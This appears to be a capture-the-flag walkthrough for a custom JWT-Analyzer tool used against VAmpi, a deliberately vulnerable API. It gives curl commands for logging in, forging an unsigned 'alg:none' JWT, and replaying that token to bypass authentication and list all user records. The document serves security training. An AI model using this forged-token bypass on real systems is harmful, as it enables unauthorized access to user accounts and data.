# JWT-Analyzer Walkthrough (FinalCTF – AuthScope Tool)

This walkthrough demonstrates how the custom JWT-Analyzer tool was used to analyze and exploit a JWT vulnerability in the VAmpi application.

Screenshots should be placed inside the `/assets/` folder and referenced below.

---

## 🟩 1. Login to VAmpi & Obtain JWT

Use the valid credentials to get a JWT:

```bash
curl -X POST http://192.168.56.107:5002/users/v1/login \
  -H "Content-Type: application/json" \
  -d '{"username":"reya", "password":"password"}'
A valid JWT is returned:

Copy code
eyJhbGciOiJIUzI1NiIs...
📷 Screenshot: assets/login.png

🟩 2. Analyze the Token Using JWT-Analyzer
Run the tool:

bash
Copy code
python3 jwt_analyzer.py "<token>"
The tool reveals:

HS256 algorithm (symmetric)

Token is valid

Claims decoded successfully

HS256 identified as brute-forceable

Token structure can be tampered

📷 Screenshot: assets/analysis.png

🟩 3. Generate the “alg:none” Exploit Token
Use the exploitation flag:

bash
Copy code
python3 jwt_analyzer.py "<token>" --generate-none
Exploit token created:

Copy code
eyJhbGciOiJub25lIn0.eyJ1c2VyIjoicmV5YSJ9.
This token:

Contains no signature

Uses "alg": "none"

Can bypass insecure JWT implementations

📷 Screenshot: assets/none_token.png

🟩 4. Use Exploit Token to Bypass Authentication
Send the unsigned token to the protected /users/v1 endpoint:

bash
Copy code
curl -X GET http://192.168.56.107:5002/users/v1 \
  -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoicmV5YSJ9."
The server returns ALL user records, including admin — meaning authentication was fully bypassed.

📷 Screenshot: assets/bypass.png

🟩 5. Exploit Result Summary
The tool successfully demonstrated:

Weak JWT implementation

Acceptance of unsigned tokens

Complete authentication bypass

Unauthorized user enumeration

Impact:
An attacker can impersonate any user and access protected data without knowing the signing secret.
